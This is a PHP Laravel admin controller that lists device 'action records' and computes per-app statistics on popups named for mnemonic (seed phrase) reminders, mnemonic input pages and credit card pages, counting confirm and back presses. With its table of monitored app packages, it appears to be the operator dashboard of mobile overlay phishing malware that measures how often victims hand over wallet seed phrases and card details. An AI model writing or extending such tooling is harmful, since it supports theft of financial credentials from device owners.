<?php

namespace App\Http\Controllers\Admin;

use App\Http\Controllers\Controller;
use App\Models\ActionRecord;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\DB;

class ActionRecordController extends Controller
{
    /**
     * 动作记录列表
     * @param Request $request
     * @return \Illuminate\Http\JsonResponse|object
     */
    public function list(Request $request)
    {
        $request->validate([
            'page' => 'required|int',
            'limit' => 'required|int',
            'device_number' => 'nullable|string',
            'app_package' => 'nullable|string',
            'action' => 'nullable|string',
            'user_action' => 'nullable|string',
        ]);

        $page = $request->get('page', 1);
        $limit = $request->get('limit', 20);
        $offset = ($page - 1) * $limit;

        // 构建基础查询（用于统计总数）
        $countModel = ActionRecord::query();
        
        // 构建列表查询（关联monitors表）
        $model = ActionRecord::query()
            ->leftJoin('monitors', 'action_records.app_package', '=', 'monitors.app_package')
            ->select(
                'action_records.*',
                'monitors.app_name'
            );

        // 按设备号搜索
        if (!empty($request->device_number)) {
            $countModel->where('action_records.device_number', 'like', '%' . $request->device_number . '%');
            $model->where('action_records.device_number', 'like', '%' . $request->device_number . '%');
        }

        // 按包名搜索
        if (!empty($request->app_package)) {
            $countModel->where('action_records.app_package', 'like', '%' . $request->app_package . '%');
            $model->where('action_records.app_package', 'like', '%' . $request->app_package . '%');
        }

        // 按动作搜索
        if (!empty($request->action)) {
            $countModel->where('action_records.action', $request->action);
            $model->where('action_records.action', $request->action);
        }

        // 按用户动作搜索
        if (!empty($request->user_action)) {
            $countModel->where('action_records.user_action', $request->user_action);
            $model->where('action_records.user_action', $request->user_action);
        }

        $count = $countModel->count();
        $list = $model->offset($offset)
            ->limit($limit)
            ->orderBy('action_records.id', 'desc')
            ->get()
            ->toArray();

        return $this->success(['total_num' => $count, 'list' => $list]);
    }

    /**
     * 动作分析统计
     * @param Request $request
     * @return \Illuminate\Http\JsonResponse|object
     */
    public function analyze(Request $request)
    {
        $request->validate([
            'operate_date' => 'nullable|date',
        ]);

        // 默认使用当前日期
        $operateDate = $request->get('operate_date', date('Y-m-d'));

        // 按包名分组统计
        $statistics = ActionRecord::query()
            ->leftJoin('monitors', 'action_records.app_package', '=', 'monitors.app_package')
            ->where('action_records.operate_date', $operateDate)
            ->whereNotNull('action_records.app_package')
            ->select(
                'action_records.operate_date',
                'action_records.app_package',
                'monitors.app_name',
                DB::raw('COUNT(*) as total_count'),
                // 提醒统计
                DB::raw("SUM(CASE WHEN action_records.action = 'popup_mnemonic_reminder' THEN 1 ELSE 0 END) as reminder_count"),
                DB::raw("SUM(CASE WHEN action_records.user_action = 'confirm' AND action_records.action = 'popup_mnemonic_reminder' THEN 1 ELSE 0 END) as reminder_confirm_count"),
                DB::raw("SUM(CASE WHEN action_records.user_action = 'back' AND action_records.action = 'popup_mnemonic_reminder' THEN 1 ELSE 0 END) as reminder_back_count"),
                // 输入统计
                DB::raw("SUM(CASE WHEN action_records.action = 'popup_mnemonic_input_page' THEN 1 ELSE 0 END) as input_show_count"),
                DB::raw("SUM(CASE WHEN action_records.action = 'popup_mnemonic_input_page' AND action_records.user_action = 'confirm' THEN 1 ELSE 0 END) as input_confirm_count"),
                DB::raw("SUM(CASE WHEN action_records.action = 'popup_mnemonic_input_page' AND action_records.user_action = 'back' THEN 1 ELSE 0 END) as input_back_count"),
                // 信用卡统计
                DB::raw("SUM(CASE WHEN action_records.action = 'popup_credit_card_page' THEN 1 ELSE 0 END) as card_show_count"),
                DB::raw("SUM(CASE WHEN action_records.action = 'popup_credit_card_page' AND action_records.user_action = 'confirm' THEN 1 ELSE 0 END) as card_confirm_count"),
                DB::raw("SUM(CASE WHEN action_records.action = 'popup_credit_card_page' AND action_records.user_action = 'back' THEN 1 ELSE 0 END) as card_back_count")
            )
            ->groupBy('action_records.app_package')
            ->get()
            ->map(function ($item) {
                return [
                    'operate_date' => $item->operate_date,
                    'app_name' => $item->app_name,
                    'reminder_count' => (int)$item->reminder_count,
                    'reminder_confirm_count' => (int)$item->reminder_confirm_count,
                    'reminder_back_count' => (int)$item->reminder_back_count,
                    'input_show_count' => (int)$item->input_show_count,
                    'input_confirm_count' => (int)$item->input_confirm_count,
                    'input_back_count' => (int)$item->input_back_count,
                    'card_show_count' => (int)$item->card_show_count,
                    'card_confirm_count' => (int)$item->card_confirm_count,
                    'card_back_count' => (int)$item->card_back_count,
                ];
            })
            ->toArray();

        return $this->success(['list' => $statistics, 'operate_date' => $operateDate]);
    }

    
}

